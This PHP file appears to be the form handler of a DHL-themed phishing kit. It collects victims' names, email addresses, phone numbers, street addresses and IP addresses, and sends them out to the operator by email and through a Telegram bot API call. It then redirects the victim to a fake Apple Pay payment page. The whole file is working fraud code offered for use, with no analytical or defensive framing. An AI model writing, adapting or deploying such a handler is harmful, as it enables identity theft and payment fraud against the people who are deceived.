<?php
session_start();
include("../common/functions.php");
include("../common/sub_includes.php");
require("../config.php");

// Check if this is a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $required = ["last-name", "first-name", "email", "telephone", "zip-code", "adresse", "city"];
    $missing = [];
    
    foreach ($required as $field) {
        if (empty($_POST[$field])) {
            $missing[] = $field;
        }
    }

    if (count($missing) === 0) {
        // Store user info in session
        $_SESSION["nom"] = $_POST["last-name"];
        $_SESSION["prenom"] = $_POST["first-name"];
        $_SESSION["fullname"] = $_POST["last-name"] . " " . $_POST["first-name"];
        $_SESSION["email"] = $_POST["email"];
        $_SESSION["phone"] = $_POST["telephone"];
        $_SESSION["zip"] = $_POST["zip-code"];
        $_SESSION["adress"] = $_POST["adresse"];
        $_SESSION["city"] = $_POST["city"];

        // Send notifications
        $message = "\n[📦] DHL INFOS [📦]\n\n👤 Nom: " . $_SESSION["nom"] . "\n👤 Prenom: " . $_SESSION["prenom"] . "\n👤 Adresse: " . $_SESSION["adress"] . "\n👤 City: " . $_SESSION["city"] . "\n👤 ZIP:" . $_SESSION["zip"] . "\n\n👤 Email: " . $_SESSION["email"] . "\n👤 Phone: " . $_SESSION["phone"] . "\n👤 Adresse IP: " . _ip() . "\n    ";

        if ($rezmail) {
            $Subject = "📦 +1 INFOS ・ " . $_SESSION['email'] . " ・ " . $_SESSION['fullname'] . " ・ " . _ip();
            $head = "From: 🥤 OxParadox <info@paradox.infos>";
            mail($mail, $Subject, $message, $head);
        }

        if ($reztelegram) {
            file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query(['text' => $message, 'chat_id' => $chat_id]));
        }

        // Mark payment as incomplete and redirect to payment page
        $_SESSION['payment_complete'] = false;
        header("Location: ../applepay.php");
        exit();
    } else {
        // If there are missing fields, redirect back to the form with error
        header("Location: ../loader.php?error=missing_fields&fields=" . urlencode(implode(',', $missing)));
        exit();
    }
} else {
    // If accessed directly, redirect to home
    header("Location: ../index.php");
    exit();
}
?>